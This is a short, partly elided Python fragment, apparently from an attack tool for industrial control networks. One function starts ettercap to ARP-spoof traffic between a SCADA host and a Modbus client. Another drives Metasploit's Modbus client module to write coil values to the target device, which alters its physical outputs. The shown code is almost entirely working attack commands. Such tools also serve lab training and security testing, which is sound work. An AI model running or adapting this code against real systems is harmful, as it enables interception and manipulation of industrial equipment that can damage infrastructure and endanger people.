...
def etterspoof():
	...
	if subprocess.getoutput("pgrep -x -c ettercap") == "0":
		...
		subprocess.Popen("sudo qterminal -e \"sudo ettercap-pkexec -Tq -n 255.255.255.0 -i eth0 -M arp:remote "+ nm_config.scada_mac + "/"+ nm_config.scada_ip +"// "+ nm_config.modcli_mac +"/"+ nm_config.modcli_ip+"//\"", shell=True, preexec_fn=os.setpgrp)
	else:
...
def msfconsole():
	try:
		...
		os.system("msfconsole -q -x \"use auxiliary/scanner/scada/modbusclient;set RHOSTS "+ nm_config.modcli_ip+";set action WRITE_COILS;set NUMBER " + str(num_coils) + ";set DATA_COILS " + coil_data + "; set DATA_ADDRESS " + coil_address + "; run;\"")
		main()
	except KeyboardInterrupt:
		print("Exiting...")
		time.sleep(0.5)
